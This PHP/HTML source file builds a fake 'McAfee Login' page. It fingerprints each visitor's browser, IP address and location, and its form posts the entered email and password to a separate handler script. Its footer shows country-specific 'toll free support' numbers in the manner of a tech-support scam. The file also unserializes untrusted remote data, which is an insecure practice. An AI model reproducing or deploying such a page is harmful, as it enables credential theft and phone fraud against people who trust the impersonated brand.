
<?php  
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];      ?> 
<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();


if(isset($_POST['submit']))
{

    $key=$_POST['key'];
}
?>
<?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?> 
<!DOCTYPE html>
<html>
<head>
	<title>Mcafee Login</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="css/login.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="shortcut icon" href="../img/favicon.ico">
    <style>
        ::-webkit-input-placeholder { /* Edge */
    color: #4d4d4d;
    font-size: 16px;
    font-weight: 300;
    text-align:left;
    /* padding-left:15px; */
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }
  
  :-ms-input-placeholder { /* Internet Explorer */
    color: #4d4d4d;
  }
  
  ::placeholder {
    color: #4d4d4d;
  }
        .loader 
        {   
            margin-left:45%;
            margin-top:15%;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #c01818;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            }

            /* Safari */
            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .rk-activ1{
            margin-top:8%;
        }
        .loader2 
        {   
            margin-left:35%;
            margin-top:10%;
            display:none;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #662d91;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            }

            /* Safari */
            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @media only screen and (max-width: 1200px)
        {
            .loader
            {
                margin-top:18%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 425px)
        {
            .loader
            {
                margin-top:35%;
                margin-left:35%;
            }
        }
        #actr{
            display:none;
        }
    </style>
</head>
<body>

    
    <div style="position: absolute; left: 0px; top: 0px; overflow: hidden; width: 100%; height: 100%;">
        
    </div>
<div class="loader1">
    <div class="container-fluid">
        <div class="col-lg-2 col-md-2"></div>
        <div class="col-lg-8 col-md-8 col-sm-12 col-xs-12 form-box">
            <div class="row">
                <div class="col-lg-3 col-md-3 col-xs-3">
                    <a href="index.php"><img src="../img/logo.png" alt=""></a> 
                </div>
                <div class="col-lg-9 col-md-9 col-xs-9" style="margin-top: -11px;">
                    
                </div>
            </div>
            <div class="col-lg-12 login-header-link">
                <div class="col-lg-8 col-xs-8">
                    <ul class="mcafee-login-header">
                        <li><a href="../act-mca.php">Activate Activation Code </a> </li>
                        <li><a href="mca-log.php">Login </a></li>
                        <li><a href="../mcareg">Register </a></li>
                        <li><a href="../mca-support.php">Contact Support </a></li>
                    </ul>
                </div>
                <div class="col-lg-4 text-right login-header-side">
                    
                </div>
            </div>
            <div class="row login-section">
                <div class="col-md-6" style="padding-left: 0px;padding-right: 10px;margin-top: -20px;">
                    <h3 class="login-heading">Log In to McAfee</h3>
                    <div class="col-lg-12 login-left-side-form">
                        <h5 class="login-welcome-message">Welcome back! Please log in below to continue.</h5>
                        <form action="option-log.php" method="post">
                            <label for="email" class="label-login-form">Email Address:</label><br>
                            <input name="emailField" type="email" class="input-key-product" required><br><br>
                            <label  for="pass"  class="label-login-form">Password:</label><br>
                            <input type="password" name="password" class="input-key-product" required><br><br>
                            <input type="checkbox"  id=""><label for="email" class="label-login-form">   &nbsp;Remember Me</label><br>
                            <input type="submit" class="log-in-button" value="LOG IN">
                        </form>
                       
                    </div>
                </div>
                <div class="col-md-6" style="padding-left: 0px;padding-right: 10px;">
                    <h5 class="login-welcome-message1">Are you a new user?</h5>
                    <div class="col-lg-12 login-right-side-form"><br>
                        <p>Don't have a McAfee account?</p>
                        <br>
                        <p>Create one today and join the ranks of those who are protected from spam, viruses, identity theft, and other online threats!</p>
                         <br><p>McAfee Safe, McAfee Secure</p><br>      
                         <a href="../mcareg" class="reg-in-button" >REGISTER NOW</a>
                    </div>
                </div>
            </div>
            <div class="clearfix"></div>
           <!-- <div class="footer"></div> -->
        </div>
        <div class="col-lg-2 col-md-2"></div>
    </div>
</div>
<div class="footer">
  <p><span class="cont-text">Customer Support Toll Free :</span> <span class="number-hp">
  
  <?php 
if($c_code == "US")
{
echo "US/CA +1 844 514 0332";
}
elseif($c_code == "CA")
{
echo "US/CA +1 844 514 0332";
}
elseif($c_code == "GB")
{
echo "UK   +44 800 229 4982";
}
elseif($c_code == "AU")
{
echo "AU   +1 844 514 0332";
}
elseif($c_code == "NZ")
{
echo "NZ   +1 844 514 0332";
}
else
{
    echo "+1 844 514 0332";
}
?>  
  </span> </p>
</div>
</body>
</html>